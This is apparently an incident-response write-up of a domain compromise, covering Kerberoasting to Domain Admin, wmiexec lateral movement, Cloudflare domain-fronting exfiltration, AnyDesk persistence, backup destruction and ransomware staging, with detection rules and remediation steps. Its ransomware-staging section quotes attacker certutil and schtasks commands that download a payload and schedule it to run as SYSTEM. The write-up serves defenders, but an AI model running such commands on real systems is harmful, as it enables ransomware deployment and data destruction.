Executive Summary

A four-step climb to Domain Admin

On the night of June 11–12, 2026, a threat actor gained initial access to the Greenfield corporate estate via a compromised VPN account (sancadmin) and established a foothold on workstation GF-WS01 under user p.singh. Within two hours, the attacker escalated from a standard domain user to Domain Admin through a four-step privilege escalation chain.

Operating as Domain Admin, the attacker moved laterally across three servers using Impacket wmiexec, staged and exfiltrated Finance, HR, and Projects share data via a Cloudflare domain-fronting tunnel, installed AnyDesk as a persistent fallback, destroyed all backup and recovery mechanisms on the backup server, staged ransomware disguised as a Sysinternals tool, and deployed a domain-wide Group Policy Object to ensure payload delivery across the entire estate. Execution was scheduled for 04:00 AM.

Clinic Key

Kerberoasting is low-noise — any domain user can request a TGS with no elevated rights. The only detection window before DCSync is EventID 4769 with EncryptionType 0x17 (RC4). If svc_backup had been configured AES-only, the ticket would be uncrackable and the entire chain collapses at Step 2.

Lateral Movement

wmiexec (Impacket)

The attacker used Impacket wmiexec to execute commands remotely on GF-SRV01, GF-BKP01, and GF-DC01. wmiexec creates a semi-interactive shell via WMI Win32_Process.Create(), staging output to a temporary file on the ADMIN$ share — a distinctive forensic signature.

Exfiltration & C2

Domain Fronting via Cloudflare

Finance, HR, and Projects shares were compressed and exfiltrated using Cloudflare's trycloudflare.com CDN as a fronting domain. HTTPS connections reach the Cloudflare edge, but the Host header redirects to the true C2 — cdn-backup.abordsecurity.space. Defenders watching only TLS SNI or TCP destination see a benign CDN address.

Detection Rule

When the URL host and the HTTP Host header disagree, the header is the true destination. Inspect TLS SNI vs HTTP Host header in proxy/firewall logs. Retries at 12:56 and 12:57 AM dropped the Host header, revealing the real CDN destination.

AnyDesk — a legitimate RMM tool — was downloaded, installed, and placed in the Startup folder on GF-SRV01, giving the attacker a persistent, legitimate remote-access channel that blends with enterprise RMM traffic and avoids custom-malware detection.

Impact Phase

Backup destruction & ransomware staging

On GF-BKP01, the attacker executed T1490 (Inhibit System Recovery) in under 90 seconds: deleted all Volume Shadow Copies, stopped the Veeam backup service, disabled Windows Recovery, and deleted the Windows Server Backup catalog.

ransomware staging
certutil -urlcache -split -f https://download.sysinternals.com/files/PsExec.zip C:\Windows\Temp\locker.exe
schtasks /create /tn "GreenfieldUpdate" /tr "C:\Windows\Temp\locker.exe" /sc once /st 04:00 /ru SYSTEM /f
Masquerading (T1036)

locker.exe was downloaded under the name PsExec.zip from a trusted Microsoft Sysinternals URL. The scheduled task reused the name "GreenfieldUpdate" — the same task name planted on GF-WS01 hours earlier, linking entry to impact.

Remediation

Incident response actions

R1 — Cut Access First

Reset all compromised credentials (d.williams, svc_backup, sancadmin, p.singh) before touching any artifact. Rotate KRBTGT twice to invalidate any forged Golden Tickets.

R2 — Remove Malicious GPO

Delete the "Greenfield Security Update" GPO from AD and purge its SYSVOL folder; run gpupdate /force estate-wide.

R3 — Rotate All Secrets

Full DCSync means every credential is burned. Reset all domain passwords, rotate KRBTGT twice, rotate trust keys.

R4 — Close Logging Blind Spots

Enable LDAP diagnostic logging and Directory Service Access auditing; alert on 4769/RC4 for service accounts.
